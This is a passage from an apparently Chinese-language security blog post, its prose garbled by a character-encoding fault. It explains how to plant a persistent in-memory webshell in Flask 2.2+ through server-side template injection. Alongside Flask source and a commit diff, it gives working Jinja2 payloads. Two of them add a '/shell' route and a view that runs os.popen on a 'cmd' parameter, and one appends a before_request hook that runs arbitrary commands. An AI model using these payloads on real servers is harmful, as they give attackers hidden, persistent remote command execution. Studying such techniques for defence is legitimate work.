<p><code>_check_setup_finished</code> æ¥è‡ªäºè£…é¥°å™¨ <code>setupmethod</code>ã€‚è¯¥è£…é¥°å™¨ä¼šå°†å‡½æ•°åŒ…è£…ä¸ºï¼šåœ¨å‡½æ•°è°ƒç”¨å‰è¦è°ƒç”¨ <code>_check_setup_finished</code> å‡½æ•°è¿›è¡Œæ£€æŸ¥ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">setupmethod</span>(<span class="params">f: F</span>) -&gt; F:</span><br><span class="line">    f_name = f.__name__</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper_func</span>(<span class="params">self, *args: t.<span class="type">Any</span>, **kwargs: t.<span class="type">Any</span></span>) -&gt; t.<span class="type">Any</span>:</span><br><span class="line">        <span class="variable language_">self</span>._check_setup_finished(f_name)</span><br><span class="line">        <span class="keyword">return</span> f(<span class="variable language_">self</span>, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> t.cast(F, update_wrapper(wrapper_func, f))</span><br></pre></td></tr></table></figure></div>

<p>è€Œæˆ‘ä»¬ä½¿ç”¨çš„è·¯ç”±æ³¨å†Œå‡½æ•° <code>add_url_rule</code> è¢«è¯¥è£…é¥°å™¨è£…é¥°ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_url_rule</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    rule: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    endpoint: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    view_func: ft.RouteCallable | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    provide_automatic_options: <span class="built_in">bool</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    **options: t.<span class="type">Any</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br></pre></td></tr></table></figure></div>

<p>ç„¶è€Œæ ¹æ®å‰é¢çš„åˆ†æï¼Œåœ¨è¿‡å»çš„ç‰ˆæœ¬ä¸­ <code>add_url_rule</code> ä¹Ÿå—åˆ°äº† <code>setupmethod</code> è£…é¥°å™¨çš„ä¿®é¥°ã€‚</p>
<p>é€šè¿‡å¯¹ Flask çš„åˆ†æå¯çŸ¥ï¼Œåœ¨ Flask 2.1.3 åˆ° Flask 2.2.0 ç‰ˆæœ¬ä¹‹é—´æœ‰ä¸€ä¸ªå…³äº <code>setupmethod</code> è£…é¥°å™¨çš„ä¿®æ”¹ï¼š</p>
<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">commit a406c297aafa28074d11ec6fd27c246c70418cb4</span><br><span class="line">Author: David Lord &lt;davidism@gmail.com&gt;</span><br><span class="line">Date:   Mon May 23 08:49:30 2022 -0700</span><br><span class="line"></span><br><span class="line">    apply setupmethod consistently</span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/flask/app.py b/src/flask/app.py</span></span><br><span class="line"><span class="comment">index e7a07add..c29c2e87 100644</span></span><br><span class="line"><span class="comment">--- a/src/flask/app.py</span></span><br><span class="line"><span class="comment">+++ b/src/flask/app.py</span></span><br><span class="line"><span class="meta">@@ -541,8 +541,17 @@</span> class Flask(Scaffold):</span><br><span class="line">         # the app&#x27;s commands to another CLI tool.</span><br><span class="line">         self.cli.name = self.name</span><br><span class="line"></span><br><span class="line"><span class="deletion">-    def _is_setup_finished(self) -&gt; bool:</span></span><br><span class="line"><span class="deletion">-        return self.debug and self._got_first_request</span></span><br><span class="line"><span class="addition">+    def _check_setup_finished(self, f_name: str) -&gt; None:</span></span><br><span class="line"><span class="addition">+        if self._got_first_request:</span></span><br><span class="line"><span class="addition">+            raise AssertionError(</span></span><br><span class="line"><span class="addition">+                f&quot;The setup method &#x27;&#123;f_name&#125;&#x27; can no longer be called&quot;</span></span><br><span class="line"><span class="addition">+                &quot; on the application. It has already handled its first&quot;</span></span><br><span class="line"><span class="addition">+                &quot; request, any changes will not be applied&quot;</span></span><br><span class="line"><span class="addition">+                &quot; consistently.\n&quot;</span></span><br><span class="line"><span class="addition">+                &quot;Make sure all imports, decorators, functions, etc.&quot;</span></span><br><span class="line"><span class="addition">+                &quot; needed to set up the application are done before&quot;</span></span><br><span class="line"><span class="addition">+                &quot; running it.&quot;</span></span><br><span class="line"><span class="addition">+            )</span></span><br><span class="line"><span class="comment">diff --git a/src/flask/scaffold.py b/src/flask/scaffold.py</span></span><br><span class="line"><span class="comment">index b2dd46f354..154426ca63 100644</span></span><br><span class="line"><span class="comment">--- a/src/flask/scaffold.py</span></span><br><span class="line"><span class="comment">+++ b/src/flask/scaffold.py</span></span><br><span class="line"><span class="meta">@@ -37,22 +37,10 @@</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> def setupmethod(f: F) -&gt; F:</span><br><span class="line"><span class="deletion">-    &quot;&quot;&quot;Wraps a method so that it performs a check in debug mode if the</span></span><br><span class="line"><span class="deletion">-    first request was already handled.</span></span><br><span class="line"><span class="deletion">-    &quot;&quot;&quot;</span></span><br><span class="line"><span class="addition">+    f_name = f.__name__</span></span><br><span class="line"> </span><br><span class="line">     def wrapper_func(self, *args: t.Any, **kwargs: t.Any) -&gt; t.Any:</span><br><span class="line"><span class="deletion">-        if self._is_setup_finished():</span></span><br><span class="line"><span class="deletion">-            raise AssertionError(</span></span><br><span class="line"><span class="deletion">-                &quot;A setup function was called after the first request &quot;</span></span><br><span class="line"><span class="deletion">-                &quot;was handled. This usually indicates a bug in the&quot;</span></span><br><span class="line"><span class="deletion">-                &quot; application where a module was not imported and&quot;</span></span><br><span class="line"><span class="deletion">-                &quot; decorators or other functionality was called too&quot;</span></span><br><span class="line"><span class="deletion">-                &quot; late.\nTo fix this make sure to import all your view&quot;</span></span><br><span class="line"><span class="deletion">-                &quot; modules, database models, and everything related at a&quot;</span></span><br><span class="line"><span class="deletion">-                &quot; central place before the application starts serving&quot;</span></span><br><span class="line"><span class="deletion">-                &quot; requests.&quot;</span></span><br><span class="line"><span class="deletion">-            )</span></span><br><span class="line"><span class="addition">+        self._check_setup_finished(f_name)</span></span><br><span class="line">         return f(self, *args, **kwargs)</span><br><span class="line"> </span><br><span class="line">     return t.cast(F, update_wrapper(wrapper_func, f))</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ 2.1.3 ç‰ˆæœ¬ï¼Œåªæœ‰<strong>å¤„äºè°ƒè¯•æ¨¡å¼</strong>ä¸”<strong>è‡³å°‘å¤„ç†ä¸€æ¬¡è¯·æ±‚å</strong>è°ƒç”¨ <code>setupmethod</code> è£…é¥°å™¨ä¿®é¥°è¿‡çš„å‡½æ•°æ‰ä¼šæŠ¥é”™ï¼Œè€Œ 2.2.0 ç‰ˆæœ¬å»æ‰äº†<strong>å¤„äºè°ƒè¯•æ¨¡å¼</strong>è¿™ä¸ªæ¡ä»¶ï¼Œå¯¼è‡´æˆ‘ä»¬ä¸èƒ½é€šè¿‡ <code>add_url_rule</code> æ³¨å†Œå†…å­˜é©¬ã€‚</p>
<h4 id="ç¯¡æ”¹è·¯ç”±è¡¨"><a href="#ç¯¡æ”¹è·¯ç”±è¡¨" class="headerlink" title="ç¯¡æ”¹è·¯ç”±è¡¨"></a>ç¯¡æ”¹è·¯ç”±è¡¨</h4><p>ç”±äº <code>add_url_rule</code> å‡½æ•°æ·»åŠ äº† <code>setupmethod</code> æ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½é€šè¿‡è°ƒç”¨ <code>add_url_rule</code> å‡½æ•°æ·»åŠ è·¯ç”±ï¼Œè€Œæ˜¯æ¨¡ä»¿ <code>add_url_rule</code> å‡½æ•°æ·»åŠ è·¯ç”±çš„è¿‡ç¨‹ï¼Œè‡ªå·±åŠ¨æ‰‹æŠŠ<strong>ä¸¤å¼ æ ¸å¿ƒè¡¨</strong>æ”¹äº†ï¼š</p>
<ul>
<li><code>app.url_map</code>ï¼ˆWerkzeug çš„ <code>Map</code>ï¼Œå­˜æ”¾ URL è§„åˆ™ï¼‰</li>
<li><code>app.view_functions</code>ï¼ˆendpoint â†’ è§†å›¾å‡½æ•° çš„å­—å…¸ï¼‰</li>
</ul>
<p>åªè¦æŠŠä¸€æ¡ <code>Rule</code> å¡è¿› <code>url_map</code>ï¼Œå†æŠŠåŒå <code>endpoint</code> çš„å¯è°ƒç”¨å¡è¿› <code>view_functions</code>ï¼Œåç»­è¯·æ±‚åŒ¹é…åˆ°è¿™ä¸ªè§„åˆ™æ—¶å°±ä¼šè°ƒç”¨ä½ å¡è¿›å»çš„å‡½æ•°ã€‚å› ä¸º<strong>æ²¡æœ‰è°ƒç”¨ <code>add_url_rule</code><strong>ï¼Œè‡ªç„¶ä¹Ÿå°±</strong>ä¸ä¼šè§¦å‘</strong>â€œé¦–ä¸ªè¯·æ±‚åç¦æ­¢ä¿®æ”¹â€çš„æ–­è¨€ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥åˆ†æä¸€ä¸‹ <code>add_url_rule</code> å‡½æ•°çš„å®ç°ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_url_rule</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    rule: <span class="built_in">str</span>,                         <span class="comment"># URL è·¯å¾„è§„åˆ™ï¼Œæ¯”å¦‚ &quot;/index&quot; æˆ– &quot;/user/&lt;id&gt;&quot;</span></span></span><br><span class="line"><span class="params">    endpoint: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,       <span class="comment"># ç«¯ç‚¹åï¼ˆendpointï¼‰ï¼Œæ˜¯è§†å›¾å‡½æ•°åœ¨ Flask å†…éƒ¨çš„å”¯ä¸€æ ‡è¯†</span></span></span><br><span class="line"><span class="params">    view_func: ft.RouteCallable | <span class="literal">None</span> = <span class="literal">None</span>,   <span class="comment"># å¤„ç†è¯¥ URL çš„è§†å›¾å‡½æ•°ï¼ˆå¯è°ƒç”¨å¯¹è±¡ï¼‰</span></span></span><br><span class="line"><span class="params">    provide_automatic_options: <span class="built_in">bool</span> | <span class="literal">None</span> = <span class="literal">None</span>, <span class="comment"># æ˜¯å¦è‡ªåŠ¨æä¾› OPTIONS æ–¹æ³•</span></span></span><br><span class="line"><span class="params">    **options: t.<span class="type">Any</span>,                  <span class="comment"># å…¶ä»–å‚æ•°ï¼Œä¼šä¼ ç»™ werkzeug.routing.Rule</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># å¦‚æœæ²¡æœ‰æ‰‹åŠ¨æŒ‡å®š endpointï¼Œåˆ™ç”¨è§†å›¾å‡½æ•°åä½œä¸º endpoint</span></span><br><span class="line">    <span class="keyword">if</span> endpoint <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        endpoint = _endpoint_from_view_func(view_func)  <span class="comment"># type: ignore</span></span><br><span class="line">    options[<span class="string">&quot;endpoint&quot;</span>] = endpoint</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...ï¼ˆè¿™é‡Œçœç•¥äº† methods å‚æ•°æ¨å¯¼ã€HEAD/OPTIONS è‡ªåŠ¨æ·»åŠ ç­‰é€»è¾‘ï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ›å»ºä¸€ä¸ª Rule å¯¹è±¡ï¼ˆwerkzeug.routing.Ruleï¼‰</span></span><br><span class="line">    <span class="comment">#    - ä¿å­˜ URL åŒ¹é…è§„åˆ™ã€å…è®¸çš„æ–¹æ³•ï¼ˆmethodsï¼‰ã€endpoint ç­‰ä¿¡æ¯</span></span><br><span class="line">    rule_obj = <span class="variable language_">self</span>.url_rule_class(rule, methods=methods, **options)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ ‡è®°æ˜¯å¦éœ€è¦è‡ªåŠ¨ç”Ÿæˆ OPTIONS æ–¹æ³•</span></span><br><span class="line">    rule_obj.provide_automatic_options = provide_automatic_options</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ğŸ“Œ æŠŠ Rule å¯¹è±¡æ·»åŠ åˆ° URL æ˜ å°„è¡¨ï¼ˆMapï¼‰ä¸­</span></span><br><span class="line">    <span class="variable language_">self</span>.url_map.add(rule_obj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¦‚æœä¼ å…¥äº†è§†å›¾å‡½æ•°ï¼Œåˆ™æŠŠå®ƒæ³¨å†Œåˆ° view_functions å­—å…¸</span></span><br><span class="line">    <span class="keyword">if</span> view_func <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># æ£€æŸ¥æ˜¯å¦å·²æœ‰åŒå endpointï¼Œå¦‚æœæœ‰ä¸”ä¸æ˜¯åŒä¸€ä¸ªå‡½æ•°ï¼Œåˆ™æŠ¥é”™</span></span><br><span class="line">        old_func = <span class="variable language_">self</span>.view_functions.get(endpoint)</span><br><span class="line">        <span class="keyword">if</span> old_func <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> old_func != view_func:</span><br><span class="line">            <span class="keyword">raise</span> AssertionError(</span><br><span class="line">                <span class="string">&quot;View function mapping is overwriting an existing&quot;</span></span><br><span class="line">                <span class="string">f&quot; endpoint function: <span class="subst">&#123;endpoint&#125;</span>&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="comment"># ğŸ“Œ æ³¨å†Œ endpoint å¯¹åº”çš„è§†å›¾å‡½æ•°</span></span><br><span class="line">        <span class="variable language_">self</span>.view_functions[endpoint] = view_func</span><br></pre></td></tr></table></figure></div>

<p>çœç•¥æ‰å¼€å¤´çš„å¤„ç†ä»£ç ï¼Œä¼šå‘ç°åœ¨å‡½æ•°æœ«å°¾çš„å¤„ç†ä¸­ï¼Œå°† <code>rule_obj</code> å¯¹è±¡æ·»åŠ åˆ°äº† <code>url_map</code> ä¸­ï¼Œä¹‹åå°† <code>view_func</code> ä½œä¸ºäº† <code>view_functions</code> å­—å…¸ä¸­ <code>endpoint</code> é”®çš„å€¼ï¼Œæ‰€ä»¥ç†è®ºä¸Šæ¥è®²ï¼Œå¯ä»¥é€šè¿‡ç›´æ¥æ“ä½œè¿™ä¸¤ä¸ªå˜é‡æ¥å®Œæˆä¸€æ¬¡æ‰‹åŠ¨çš„ <code>add_url_rule</code>ã€‚</p>
<p>å‡è®¾æˆ‘ä»¬æ˜¯åœ¨ SSTI çš„æƒ…å¢ƒä¸‹ï¼Œç”±äºæ­¤æ—¶ä¸èƒ½ä¸€æ¬¡æ‰§è¡Œå¤šæ¡ Python è¯­å¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åˆ†ä¸¤æ­¥æ¤å…¥å†…å­˜é©¬ï¼š</p>
<ol>
<li><p>é¦–å…ˆæ„é€ ç¬¬ä¸€æ¡è¯·æ±‚å‘ <code>url_map</code> ä¸­æ–°å¢ä¸€æ¡ <code>UrlRule</code>ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.url_map.add(app.url_rule_class(&#x27;/shell&#x27;,methods=[&#x27;GET&#x27;],endpoint=&#x27;shell&#x27;))&quot;, &#123;&#x27;app&#x27;: g.pop.__globals__.sys.modules[&#x27;__main__&#x27;].app&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>ä¹‹åå†æ„é€ ç¬¬äºŒæ¡è¯·æ±‚ï¼Œå‘ <code>view_functions</code> ä¸­å¢åŠ å¯¹åº” <code>endpoint</code> çš„å®ç°ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.view_functions.update(&#123;&#x27;shell&#x27;:lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()&#125;)&quot;, &#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;: g.pop.__globals__.sys.modules[&#x27;__main__&#x27;].app&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h4 id="æ³¨å†Œè¯·æ±‚é’©å­"><a href="#æ³¨å†Œè¯·æ±‚é’©å­" class="headerlink" title="æ³¨å†Œè¯·æ±‚é’©å­"></a>æ³¨å†Œè¯·æ±‚é’©å­</h4><p>ä½† Flask è¿˜æœ‰ä¸€ç±»æœºåˆ¶â€”â€”<strong>è¯·æ±‚é’©å­ï¼ˆRequest Hooksï¼‰</strong>ï¼Œå®ƒä»¬ä¸å— <code>@setupmethod</code> é™åˆ¶ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶ç»§ç»­è¿½åŠ ã€‚</p>
<p>Flask æä¾›ä»¥ä¸‹å¸¸ç”¨é’©å­ï¼ˆæŒ‰æ‰§è¡Œé¡ºåºï¼‰ï¼š</p>
<table>
<thead>
<tr>
<th>é’©å­</th>
<th>è°ƒç”¨æ—¶æœº</th>
<th>å‡½æ•°ç­¾å</th>
<th>è¿”å›å€¼è¦æ±‚</th>
</tr>
</thead>
<tbody><tr>
<td><code>before_first_request</code></td>
<td>ç¬¬ä¸€ä¸ªè¯·æ±‚å‰ï¼ˆåªæ‰§è¡Œä¸€æ¬¡ï¼‰</td>
<td><code>f()</code></td>
<td>å¿½ç•¥è¿”å›å€¼</td>
</tr>
<tr>
<td><code>before_request</code></td>
<td>æ¯ä¸ªè¯·æ±‚å¤„ç†å‰</td>
<td><code>f()</code></td>
<td><code>None</code> æˆ– <code>Response</code>ï¼ˆè¿”å› <code>Response</code> ä¼šçŸ­è·¯ï¼‰</td>
</tr>
<tr>
<td><code>after_request</code></td>
<td>æ¯ä¸ªè¯·æ±‚å¤„ç†å</td>
<td><code>f(response)</code></td>
<td><strong>å¿…é¡»è¿”å›</strong> <code>Response</code></td>
</tr>
<tr>
<td><code>teardown_request</code></td>
<td>æ¯ä¸ªè¯·æ±‚ç»“æŸæ—¶</td>
<td><code>f(exception)</code></td>
<td>å¿½ç•¥è¿”å›å€¼</td>
</tr>
<tr>
<td><code>errorhandler</code></td>
<td>æŒ‡å®šå¼‚å¸¸å‘ç”Ÿæ—¶</td>
<td><code>f(error)</code></td>
<td><code>Response</code></td>
</tr>
</tbody></table>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>è¿™é‡Œé’©å­çš„åç§°æŒ‡çš„æ˜¯<strong>ç”¨äºæ³¨å†Œå›è°ƒå‡½æ•°çš„è£…é¥°å™¨</strong>çš„åç§°ã€‚</p>

    </div>
  </div>

<p>è¿™é‡Œä»¥ <code>before_request</code> å’Œ <code>after_request</code> ä¸¤ä¸ªè£…é¥°å™¨å‡½æ•°ä¸ºä¾‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>(<span class="params">self, f: T_before_request</span>) -&gt; T_before_request:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    æ³¨å†Œä¸€ä¸ªå‡½æ•°ï¼Œåœ¨æ¯æ¬¡è¯·æ±‚ä¹‹å‰è¿è¡Œã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ä¾‹å¦‚ï¼Œè¿™å¯ä»¥ç”¨æ¥æ‰“å¼€æ•°æ®åº“è¿æ¥ï¼Œæˆ–è€…</span></span><br><span class="line"><span class="string">    ä» session ä¸­åŠ è½½å·²ç™»å½•çš„ç”¨æˆ·ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ç¤ºä¾‹ï¼š</span></span><br><span class="line"><span class="string">        @app.before_request</span></span><br><span class="line"><span class="string">        def load_user():</span></span><br><span class="line"><span class="string">            if &quot;user_id&quot; in session:</span></span><br><span class="line"><span class="string">                g.user = db.session.get(session[&quot;user_id&quot;])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    è¯¥å‡½æ•°ä¼šåœ¨è°ƒç”¨æ—¶ **ä¸å¸¦ä»»ä½•å‚æ•°**ã€‚</span></span><br><span class="line"><span class="string">    å¦‚æœå®ƒè¿”å›ä¸€ä¸ªé ``None`` çš„å€¼ï¼Œ</span></span><br><span class="line"><span class="string">    è¿™ä¸ªè¿”å›å€¼ä¼šè¢«å½“ä½œè§†å›¾å‡½æ•°çš„è¿”å›å€¼æ¥å¤„ç†ï¼Œ</span></span><br><span class="line"><span class="string">    å¹¶ä¸”ä¼š**ç»ˆæ­¢åç»­çš„è¯·æ±‚å¤„ç†**ã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="variable language_">self</span>.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after_request</span>(<span class="params">self, f: T_after_request</span>) -&gt; T_after_request:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    æ³¨å†Œä¸€ä¸ªå‡½æ•°ï¼Œåœ¨æ¯æ¬¡è¯·æ±‚å¤„ç†å®Œæˆåï¼ˆå“åº”è¿”å›ä¹‹å‰ï¼‰è¿è¡Œã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    è¯¥å‡½æ•°ä¼šæ¥æ”¶ä¸€ä¸ªå“åº”å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œä¸”**å¿…é¡»è¿”å›ä¸€ä¸ªå“åº”å¯¹è±¡**ã€‚</span></span><br><span class="line"><span class="string">    è¿™æ ·å°±å¯ä»¥åœ¨å“åº”å‘é€ç»™å®¢æˆ·ç«¯ä¹‹å‰ï¼Œå¯¹å…¶è¿›è¡Œä¿®æ”¹æˆ–æ›¿æ¢ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å¦‚æœæŸä¸ªå‡½æ•°æŠ›å‡ºå¼‚å¸¸ï¼Œåˆ™å‰©ä½™çš„ ``after_request`` å‡½æ•°å°†**ä¸ä¼š**è¢«è°ƒç”¨ã€‚</span></span><br><span class="line"><span class="string">    å› æ­¤ï¼Œè¿™ä¸ªé’©å­ä¸åº”ç”¨äºå¿…é¡»æ‰§è¡Œçš„æ¸…ç†æ“ä½œï¼Œ</span></span><br><span class="line"><span class="string">    æ¯”å¦‚å…³é—­èµ„æº â€”â€” å¯¹äºè¿™ç±»æ“ä½œåº”ä½¿ç”¨ :meth:`teardown_request`ã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="variable language_">self</span>.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure></div>

<p>è™½ç„¶ä¸¤ä¸ªå‡½æ•°åŒæ ·è¢« <code>setupmethod</code> è£…é¥°å™¨ä¿®é¥°ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°å®ç°éå¸¸ç®€å•ï¼Œæœ¬è´¨ä¸Šéƒ½æ˜¯<strong>å¾€ä¸€ä¸ªå­—å…¸ä¸­ key ä¸º <code>None</code> çš„å¯¹åº”çš„åˆ—è¡¨ä¸­æ·»åŠ å‡½æ•°</strong>ã€‚</p>
<p>å› æ­¤æˆ‘ä»¬å®Œå…¨å¯ä»¥å°†è£…é¥°å™¨å‡½æ•°ä¸­çš„ä»£ç æ‰§è¡Œä¸€éä»è€Œå°†å†…å­˜é©¬æ³¨å†Œè¿›å»ã€‚</p>
<p>ç”±äº <code>before_request</code> å‡½æ•°å¦‚æœè¿”å›ä¸€ä¸ªé <code>None</code> çš„å€¼åˆ™è¿™ä¸ªè¿”å›å€¼ä¼šè¢«å½“ä½œè§†å›¾å‡½æ•°çš„è¿”å›å€¼æ¥å¤„ç†ï¼Œå¹¶ä¸”ä¼š<strong>ç»ˆæ­¢åç»­çš„è¯·æ±‚å¤„ç†</strong>ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å†…å­˜é©¬å‡½æ•°é€šè¿‡ <code>app.before_request_funcs.setdefault</code> æ³¨å†Œè¿›å»ï¼Œè¿™æ ·å†…å­˜é©¬çš„è¿”å›å€¼ç›´æ¥å°±å¯ä»¥å›æ˜¾å›æ¥ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.before_request_funcs.setdefault(None,[]).append(lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read())&quot;, &#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;: g.pop.__globals__.sys.modules[&#x27;__main__&#x27;].app&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure></div>

